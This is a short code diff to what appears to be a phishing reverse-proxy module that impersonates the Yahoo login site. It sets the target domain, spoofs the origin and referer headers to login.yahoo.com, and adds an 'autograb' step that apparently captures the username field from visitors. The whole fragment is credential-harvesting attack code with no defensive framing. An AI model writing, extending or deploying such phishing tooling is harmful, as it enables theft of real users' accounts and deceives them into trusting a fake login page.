@@ -107,6 +107,8 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
+
                
         this.req.headers['origin'] = 'https://login.yahoo.com'
         this.req.headers['referer'] = 'https://login.yahoo.com'
@@ -186,6 +188,8 @@ const configExport = {
     CURRENT_DOMAIN: 'login.yahoo.com',
 
     START_PATH: '/',
+
+    AUTOGRAB_CODE: 'username',
 
 
     PRE_HANDLERS:
